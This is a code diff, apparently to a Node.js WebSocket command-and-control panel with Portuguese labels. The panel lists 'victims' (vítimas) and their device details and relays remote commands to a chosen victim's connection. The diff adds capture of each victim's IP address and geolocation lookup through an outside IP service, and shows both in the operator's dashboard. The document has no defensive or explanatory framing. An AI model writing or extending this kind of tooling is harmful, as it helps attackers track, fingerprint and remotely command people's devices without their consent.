@@ -9,6 +9,22 @@ const sessions = {};
 const victimConnections = {};
 const adminClients = new Set();
 
+// Cache de geolocalização por IP
+const geoCache = {};
+
+async function getGeo(ip) {
+  if (geoCache[ip]) return geoCache[ip];
+  try {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    const data = await response.json();
+    if (data && data.city) {
+      geoCache[ip] = `${data.city}, ${data.region}, ${data.country_name}`;
+      return geoCache[ip];
+    }
+  } catch(e) {}
+  return 'Desconhecido';
+}
+
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -215,7 +231,6 @@ app.get('/', (req, res) => {
       ws.onclose = () => setTimeout(connect, 2000);
     }
 
-    // ---------- ENVIA COMANDO ----------
     function sendCommand(cmd, extra) {
       if (!selectedId) { alert('Selecione uma vítima primeiro!'); return; }
       const payload = { type: 'command', cmd: cmd, target: selectedId };
@@ -240,7 +255,6 @@ app.get('/', (req, res) => {
       if (e.key === 'Enter') document.getElementById('cmd-execute').click();
     });
 
-    // ---------- RENDER ----------
     function renderSidebar() {
       const ids = Object.keys(allData);
       document.getElementById('total-count').textContent = ids.length;
@@ -270,6 +284,8 @@ app.get('/', (req, res) => {
       if (h && h.device) {
         const d = h.device;
         const accessTime = h._t ? new Date(h._t).toLocaleString('pt-BR') : 'desconhecido';
+        const ip = h.ip || 'desconhecido';
+        const geo = h.geo || 'Desconhecido';
         div.style.display = 'flex';
         div.innerHTML = \`
           <span class="item"><span class="label">Marca/Modelo:</span> <span class="value">\${d.brand || '?'} \${d.deviceModel || '?'}</span></span>
@@ -277,7 +293,9 @@ app.get('/', (req, res) => {
           <span class="item"><span class="label">Tela:</span> <span class="value">\${d.screen?.w || '?'}x\${d.screen?.h || '?'}</span></span>
           <span class="item"><span class="label">RAM:</span> <span class="value">\${d.hardware?.memory || '?'} GB</span></span>
           <span class="item"><span class="label">Rede:</span> <span class="value">\${d.network?.type || '?'}</span></span>
-          <span class="item"><span class="label">Acesso em:</span> <span class="value">\${accessTime}</span></span>
+          <span class="item"><span class="label">IP:</span> <span class="value">\${ip}</span></span>
+          <span class="item"><span class="label">Localização:</span> <span class="value">\${geo}</span></span>
+          <span class="item"><span class="label">Acesso:</span> <span class="value">\${accessTime}</span></span>
         \`;
       } else {
         div.style.display = 'none';
@@ -396,7 +414,6 @@ app.get('/', (req, res) => {
       container.scrollTop = container.scrollHeight;
     }
 
-    // ---------- ABAS ----------
     document.querySelectorAll('.tabs button').forEach(btn => {
       btn.addEventListener('click', function() {
         document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
@@ -406,7 +423,6 @@ app.get('/', (req, res) => {
       });
     });
 
-    // ---------- LIMPAR ----------
     document.getElementById('clear-logs').addEventListener('click', function() {
       if (!selectedId || !confirm('Limpar logs de ' + selectedId + '?')) return;
       allData[selectedId] = [];
@@ -423,22 +439,27 @@ app.get('/', (req, res) => {
 });
 
 // ---------- WEBSOCKET ----------
-wss.on('connection', (ws) => {
+wss.on('connection', async (ws) => {
   ws.isAdmin = false;
-  // Armazena IP se disponível
-  const ip = ws._socket.remoteAddress || 'desconhecido';
+  const ip = (ws._socket.remoteAddress || 'desconhecido').replace('::ffff:', '');
+  let geo = 'Desconhecido';
+  try {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    const data = await response.json();
+    if (data && data.city) {
+      geo = `${data.city}, ${data.region}, ${data.country_name}`;
+    }
+  } catch(e) {}
 
   ws.on('message', (msg) => {
     try {
       const data = JSON.parse(msg);
-
       if (data.type === 'admin') {
         ws.isAdmin = true;
         adminClients.add(ws);
         ws.send(JSON.stringify({ type: 'init', data: sessions }));
         return;
       }
-
       if (data.type === 'clear' && data.sess) {
         if (sessions[data.sess]) sessions[data.sess] = [];
         adminClients.forEach(client => {
@@ -448,7 +469,6 @@ wss.on('connection', (ws) => {
         });
         return;
       }
-
       if (data.type === 'command' && data.target) {
         const targetWs = victimConnections[data.target];
         if (targetWs && targetWs.readyState === WebSocket.OPEN) {
@@ -469,7 +489,6 @@ wss.on('connection', (ws) => {
         }
         return;
       }
-
       if (data.sess) {
         if (!victimConnections[data.sess] || victimConnections[data.sess].readyState !== WebSocket.OPEN) {
           victimConnections[data.sess] = ws;
@@ -478,8 +497,10 @@ wss.on('connection', (ws) => {
           });
         }
         if (!sessions[data.sess]) sessions[data.sess] = [];
-        // Adiciona IP ao handshake
-        if (data.type === 'handshake') data.ip = ip;
+        if (data.type === 'handshake') {
+          data.ip = ip;
+          data.geo = geo;
+        }
         sessions[data.sess].push(data);
         adminClients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
